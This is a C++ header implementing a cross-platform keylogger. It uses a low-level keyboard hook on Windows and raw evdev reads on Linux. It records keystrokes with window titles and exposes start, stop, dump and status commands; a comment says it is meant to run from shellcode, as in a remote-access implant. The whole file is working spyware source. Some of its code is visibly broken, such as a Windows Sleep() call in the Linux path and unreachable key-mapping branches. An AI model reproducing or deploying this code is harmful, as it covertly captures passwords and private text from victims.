#pragma once

#include <string>
#include <sstream>
#include <cstring>
#include <atomic>
#include <thread>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#else
    #include <unistd.h>
    #include <fcntl.h>
    #include <dirent.h>
    #include <cstdio>
    #include <vector>
    #include <linux/input.h>
#endif

namespace keylogger {

#ifdef _WIN32

// Raw buffers — safe for shellcode context (no CRT constructors needed)
inline char key_buffer[131072];
inline size_t key_buffer_len = 0;
inline char last_title[256];
inline bool is_running = false;
inline size_t key_events_total = 0;

// Spinlock for buffer synchronization (no CRT init needed)
inline volatile LONG key_lock = 0;

inline void key_acquire() {
    while (InterlockedExchange(&key_lock, 1) != 0) Sleep(0);
}
inline void key_release() {
    InterlockedExchange(&key_lock, 0);
}

// Hook handles
inline HHOOK g_hhook = NULL;
inline HANDLE g_hook_thread = NULL;
inline DWORD g_hook_tid = 0;

// ── Helpers ─────────────────────────────────────────────────────
inline std::string GetActiveWindowTitle() {
    HWND hForeground = GetForegroundWindow();
    if (!hForeground) return "Unknown Window";
    char title[256];
    if (GetWindowTextA(hForeground, title, sizeof(title)))
        return std::string(title);
    return "Untitled Window";
}

inline void append_to_buffer(const char* data, size_t len) {
    if (len == 0) return;
    if (len >= sizeof(key_buffer) - 1) {
        data += len - (sizeof(key_buffer) - 2);
        len = sizeof(key_buffer) - 2;
    }
    while (key_buffer_len + len + 1 > sizeof(key_buffer)) {
        size_t discard = key_buffer_len / 2;
        if (discard == 0) discard = 1;
        memmove(key_buffer, key_buffer + discard, key_buffer_len - discard);
        key_buffer_len -= discard;
    }
    memcpy(key_buffer + key_buffer_len, data, len);
    key_buffer_len += len;
    key_buffer[key_buffer_len] = '\0';
}

inline void append_char(char c) {
    char buf = c;
    append_to_buffer(&buf, 1);
}

inline void append_string(const std::string& s) {
    append_to_buffer(s.data(), s.size());
}

inline void track_window_change(const std::string& title) {
    if (title != last_title) {
        std::string header = "\n\n[Window: " + title + "]\n";
        append_string(header);
        size_t cp = title.copy(last_title, sizeof(last_title) - 1);
        last_title[cp] = '\0';
    }
}

// ── LL Keyboard Hook Procedure ──────────────────────────────────
inline LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;

        std::string title = GetActiveWindowTitle();

        key_acquire();
        key_events_total++;

        track_window_change(title);

        BYTE state[256];
        bool got_state = GetKeyboardState(state) != 0;

        bool handled = false;

        if (got_state) {
            UINT scan = kbs->scanCode;
            if (kbs->flags & LLKHF_EXTENDED) scan |= 0xE000;

            wchar_t chars[16] = {};
            int ret = ToUnicode(kbs->vkCode, scan, state, chars, 16, 0);

            if (ret > 0) {
                for (int i = 0; i < ret; i++) {
                    wchar_t c = chars[i];
                    if (c == L'\r' || c == L'\n') {
                        append_char('\n');
                    } else if (c == L'\b') {
                        if (key_buffer_len > 0) key_buffer_len--;
                    } else if (c == L'\t') {
                        append_char('\t');
                    } else if (c >= 32 && c <= 126) {
                        append_char((char)c);
                    }
                }
                handled = true;
            }
        }

        if (!handled) {
            bool matched = true;
            if (kbs->vkCode == VK_SPACE) {
                append_char(' ');
            } else if (kbs->vkCode >= 0x30 && kbs->vkCode <= 0x39) {
                append_char('0' + (kbs->vkCode - 0x30));
            } else if (kbs->vkCode >= 0x41 && kbs->vkCode <= 0x5A) {
                append_char('a' + (kbs->vkCode - 0x41));
            } else {
                switch (kbs->vkCode) {
                    case VK_RETURN:  append_char('\n'); break;
                    case VK_BACK:    if (key_buffer_len > 0) key_buffer_len--; break;
                    case VK_TAB:     append_char('\t'); break;
                    case VK_ESCAPE:  append_string("[ESC]"); break;
                    case VK_DELETE:  append_string("[DEL]"); break;
                    case VK_INSERT:  append_string("[INS]"); break;
                    case VK_HOME:    append_string("[HOME]"); break;
                    case VK_END:     append_string("[END]"); break;
                    case VK_PRIOR:   append_string("[PGUP]"); break;
                    case VK_NEXT:    append_string("[PGDN]"); break;
                    case VK_LEFT:    append_string("[LEFT]"); break;
                    case VK_RIGHT:   append_string("[RIGHT]"); break;
                    case VK_UP:      append_string("[UP]"); break;
                    case VK_DOWN:    append_string("[DOWN]"); break;
                    case VK_SNAPSHOT:append_string("[PRTSC]"); break;
                    default:         matched = false; break;
                }
                if (!matched && kbs->vkCode >= VK_F1 && kbs->vkCode <= VK_F24) {
                    int fn = kbs->vkCode - VK_F1 + 1;
                    std::string fk = "[F" + std::to_string(fn) + "]";
                    append_string(fk);
                    matched = true;
                }
            }
            if (!matched) {
                char buf[16];
                snprintf(buf, sizeof(buf), "[VK:0x%02lX]", kbs->vkCode);
                append_string(std::string(buf));
            }
        }

        key_buffer[key_buffer_len] = '\0';
        key_release();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

inline void poll() {
}

// ── Hook Thread ──────────────────────────────────
inline DWORD WINAPI hook_thread(LPVOID) {
    g_hhook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, GetModuleHandleW(NULL), 0);
    if (!g_hhook) return 1;
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(g_hhook);
    g_hhook = NULL;
    return 0;
}

// ── Public API ──────────────────────────────────────────────────
inline std::string start() {
    if (is_running) {
        is_running = false;
        if (g_hhook) {
            PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
            if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT)
                TerminateThread(g_hook_thread, 0);
            CloseHandle(g_hook_thread);
            g_hook_thread = NULL;
        }
    }
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_events_total = 0;
    last_title[0] = '\0';
    key_lock = 0;
    g_hhook = NULL;

    g_hook_thread = CreateThread(NULL, 0, hook_thread, NULL, 0, &g_hook_tid);
    if (!g_hook_thread) return "Keylogger start FAILED (CreateThread).";

    Sleep(200);
    if (!g_hhook) {
        DWORD err = GetLastError();
        WaitForSingleObject(g_hook_thread, 1000);
        CloseHandle(g_hook_thread);
        g_hook_thread = NULL;
        return "Keylogger start FAILED (SetWindowsHookEx, error " + std::to_string(err) + ").";
    }

    is_running = true;
    return "Keylogger started (LL keyboard hook).";
}

inline std::string stop() {
    if (!is_running) return "Keylogger is not running.";
    is_running = false;
    if (g_hhook) {
        PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
        if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT) {
            TerminateThread(g_hook_thread, 0);
        }
        CloseHandle(g_hook_thread);
        g_hook_thread = NULL;
    }
    return "Keylogger stopped.";
}

inline std::string dump(const std::string& filter = "") {
    key_acquire();
    if (key_buffer_len == 0) {
        key_release();
        return "Buffer is empty. No keystrokes captured yet.";
    }
    std::string raw(key_buffer, key_buffer_len);
    key_release();

    if (filter.empty()) {
        return "--- KEYLOG DUMP ---\n" + raw + "\n--- END DUMP ---";
    }
    std::string out = "--- KEYLOG DUMP (Filter: " + filter + ") ---\n";
    std::string line;
    std::istringstream stream(raw);
    bool in_target = false;
    while (std::getline(stream, line)) {
        if (line.find("[Window:") != std::string::npos)
            in_target = (line.find(filter) != std::string::npos);
        else if (in_target)
            out += line + "\n";
    }
    out += "--- END DUMP ---";
    return out;
}

inline std::string clear() {
    key_acquire();
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_release();
    return "Buffer cleared.";
}

inline std::string status() {
    char buf[256];
    snprintf(buf, sizeof(buf), "Keylogger: %s | Buffer: %zu/%zu (%zu%%) | Events: %zu",
             is_running ? "RUNNING" : "STOPPED",
             key_buffer_len, sizeof(key_buffer) - 1,
             (key_buffer_len * 100) / (sizeof(key_buffer) - 1),
             key_events_total);
    return std::string(buf);
}

#else

// Linux evdev keylogger
inline std::atomic<bool> is_running{false};
inline std::thread ev_thread;
inline char key_buffer[131072];
inline size_t key_buffer_len = 0;
inline size_t key_events_total = 0;

// Simple spinlock for buffer access
inline std::atomic<int> key_lock{0};

inline void key_acquire() {
    int expected = 0;
    while (!key_lock.compare_exchange_weak(expected, 1, std::memory_order_acquire)) {
        expected = 0;
        usleep(100);
    }
}

inline void key_release() {
    key_lock.store(0, std::memory_order_release);
}

inline void append_to_buffer(const char* data, size_t len) {
    if (len == 0) return;
    while (key_buffer_len + len + 1 > sizeof(key_buffer)) {
        size_t discard = key_buffer_len / 2;
        if (discard == 0) discard = 1;
        memmove(key_buffer, key_buffer + discard, key_buffer_len - discard);
        key_buffer_len -= discard;
    }
    memcpy(key_buffer + key_buffer_len, data, len);
    key_buffer_len += len;
    key_buffer[key_buffer_len] = '\0';
}

inline void append_char(char c) {
    char buf = c;
    append_to_buffer(&buf, 1);
}

inline void append_string(const std::string& s) {
    append_to_buffer(s.data(), s.size());
}

// Keycode mapping for evdev
// KEY_RESERVED=0 ... KEY_MAX=0x2FF
// We map common keys here
inline const char* evdev_keyname(int code) {
    if (code >= 1 && code <= 255) return nullptr; // Let main table handle
    switch (code) {
        case 1: return "[ESC]";
        case 14: return "[BSPC]";
        case 15: return "[TAB]";
        case 28: return "\n";
        case 29: return "[LCTRL]";
        case 42: return "[LSHIFT]";
        case 54: return "[RSHIFT]";
        case 56: return "[LALT]";
        case 57: return " ";
        case 97: return "[RCTRL]";
        case 100: return "[RALT]";
        case 102: return "[HOME]";
        case 103: return "[UP]";
        case 104: return "[PGUP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 107: return "[END]";
        case 108: return "[DOWN]";
        case 109: return "[PGDN]";
        case 110: return "[INS]";
        case 111: return "[DEL]";
        case 119: return "[PAUSE]";
        case 127: return "[F1]";
        case 128: return "[F2]";
        case 129: return "[F3]";
        case 130: return "[F4]";
        case 131: return "[F5]";
        case 132: return "[F6]";
        case 133: return "[F7]";
        case 134: return "[F8]";
        case 135: return "[F9]";
        case 136: return "[F10]";
        case 137: return "[F11]";
        case 138: return "[F12]";
    }
    return nullptr;
}

// Map evdev keycode to ASCII (simplified US layout)
inline char evdev_to_ascii(int code, bool shift) {
    // Letters
    if (code >= 16 && code <= 25) { // Q W E R T Z U I O P (or A row)
        static const char lower[] = "qwertzuiop";
        static const char upper[] = "QWERTZUIOP";
        int idx = code - 16;
        if (idx < 10) return shift ? upper[idx] : lower[idx];
        return 0;
    }
    if (code >= 30 && code <= 38) { // A S D F G H J K L
        static const char lower[] = "asdfghjkl";
        static const char upper[] = "ASDFGHJKL";
        int idx = code - 30;
        if (idx < 9) return shift ? upper[idx] : lower[idx];
        return 0;
    }
    if (code >= 44 && code <= 50) { // Y X C V B N M
        static const char lower[] = "yxcvbnm";
        static const char upper[] = "YXCVBNM";
        int idx = code - 44;
        if (idx < 7) return shift ? upper[idx] : lower[idx];
        return 0;
    }
    // Numbers
    if (code >= 2 && code <= 11) {
        static const char num[] = "1234567890";
        static const char sym[] = "!@#$%^&*()";
        int idx = code - 2;
        if (idx < 10) return shift ? sym[idx] : num[idx];
        return 0;
    }
    // Special keys (US layout)
    switch (code) {
        case 12: return '-'; case 13: return '=';  // - =
        case 26: return '['; case 27: return ']';  // [ ]
        case 39: return ';'; case 40: return '\'';  // ; '
        case 41: return '`';                        // `
        case 43: return '\\'; case 51: return ',';  // \ ,
        case 52: return '.'; case 53: return '/';   // . /
        case 57: return ' ';                        // space
        case 28: return '\n';                       // enter
        case 14: return '\b';                       // backspace
        case 15: return '\t';                       // tab
    }
    // Shifted versions
    if (code == 12) return shift ? '_' : '-';
    if (code == 13) return shift ? '+' : '=';
    if (code == 26) return shift ? '{' : '[';
    if (code == 27) return shift ? '}' : ']';
    if (code == 39) return shift ? ':' : ';';
    if (code == 40) return shift ? '"' : '\'';
    if (code == 41) return shift ? '~' : '`';
    if (code == 43) return shift ? '|' : '\\';
    if (code == 51) return shift ? '<' : ',';
    if (code == 52) return shift ? '>' : '.';
    if (code == 53) return shift ? '?' : '/';
    return 0;
}

inline void evdev_worker() {
    // Open all /dev/input/event* devices
    std::vector<int> fds;
    DIR* dir = opendir("/dev/input");
    if (!dir) return;
    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            std::string path = std::string("/dev/input/") + entry->d_name;
            int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
            if (fd >= 0) fds.push_back(fd);
        }
    }
    closedir(dir);

    if (fds.empty()) {
        // Try /dev/input/by-path or just direct /dev/input/event0
        int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
        if (fd >= 0) fds.push_back(fd);
        fd = open("/dev/input/event1", O_RDONLY | O_NONBLOCK);
        if (fd >= 0) fds.push_back(fd);
    }

    bool shift_pressed = false;
    bool ctrl_pressed = false;
    bool alt_pressed = false;

    while (is_running) {
        fd_set readfds;
        FD_ZERO(&readfds);
        int maxfd = 0;
        for (int fd : fds) {
            FD_SET(fd, &readfds);
            if (fd > maxfd) maxfd = fd;
        }
        timeval tv = {1, 0};
        int sel = select(maxfd + 1, &readfds, nullptr, nullptr, &tv);
        if (sel <= 0) continue;

        for (int fd : fds) {
            if (!FD_ISSET(fd, &readfds)) continue;

            struct input_event ev;
            int n = read(fd, &ev, sizeof(ev));
            if (n != (int)sizeof(ev)) continue;

            if (ev.type != 1) continue; // EV_KEY only

            if (ev.value == 1) { // Key press
                int code = ev.code;
                key_acquire();
                key_events_total++;

                // Track modifiers
                if (code == 42 || code == 54) shift_pressed = true;
                if (code == 29 || code == 97) ctrl_pressed = true;
                if (code == 56 || code == 100) alt_pressed = true;

                char ascii = evdev_to_ascii(code, shift_pressed);
                if (ascii != 0) {
                    append_char(ascii);
                } else {
                    const char* name = evdev_keyname(code);
                    if (name) {
                        append_string(name);
                    }
                }

                key_release();
            } else if (ev.value == 0) { // Key release
                int code = ev.code;
                if (code == 42 || code == 54) shift_pressed = false;
                if (code == 29 || code == 97) ctrl_pressed = false;
                if (code == 56 || code == 100) alt_pressed = false;
            }
        }
    }

    for (int fd : fds) close(fd);
}

inline std::string start() {
    if (is_running) return "Keylogger already running.";
    is_running = true;
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_events_total = 0;
    ev_thread = std::thread(evdev_worker);
    ev_thread.detach();
    return "Keylogger started (evdev).";
}

inline std::string stop() {
    if (!is_running) return "Keylogger is not running.";
    is_running = false;
    // Thread will exit on next select timeout
    Sleep(1500);
    return "Keylogger stopped.";
}

inline std::string dump(const std::string& filter = "") {
    key_acquire();
    if (key_buffer_len == 0) {
        key_release();
        return "Buffer is empty. No keystrokes captured yet.";
    }
    std::string raw(key_buffer, key_buffer_len);
    key_release();

    if (filter.empty()) {
        return "--- KEYLOG DUMP ---\n" + raw + "\n--- END DUMP ---";
    }
    std::string out = "--- KEYLOG DUMP (Filter: " + filter + ") ---\n";
    std::string line;
    std::istringstream stream(raw);
    bool in_target = false;
    while (std::getline(stream, line)) {
        if (line.find("[Window:") != std::string::npos)
            in_target = (line.find(filter) != std::string::npos);
        else if (in_target)
            out += line + "\n";
    }
    out += "--- END DUMP ---";
    return out;
}

inline std::string clear() {
    key_acquire();
    key_buffer_len = 0;
    key_buffer[0] = '\0';
    key_release();
    return "Buffer cleared.";
}

inline std::string status() {
    char buf[256];
    snprintf(buf, sizeof(buf), "Keylogger: %s | Buffer: %zu/%zu (%zu%%) | Events: %zu",
             is_running ? "RUNNING" : "STOPPED",
             key_buffer_len, sizeof(key_buffer) - 1,
             (key_buffer_len * 100) / (sizeof(key_buffer) - 1),
             key_events_total);
    return std::string(buf);
}

inline void poll() {
    // Periodic tasks: nothing needed for evdev (runs in its own thread)
}

#endif

} // namespace keylogger
